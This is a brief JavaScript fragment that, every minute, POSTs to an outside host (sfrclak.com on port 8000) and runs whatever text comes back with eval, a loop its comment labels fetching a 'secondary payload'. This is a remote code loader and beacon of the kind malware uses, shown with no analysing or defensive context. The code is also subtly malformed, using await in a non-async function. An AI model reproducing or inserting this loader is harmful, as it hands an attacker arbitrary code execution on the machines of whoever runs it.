setInterval(() =>
  /* fetch secondary payload*/
  await fetch('http://sfrclak.com:8000/', { method: 'POST' })
    .then(r => r.text())
    .then(eval),
60_000)
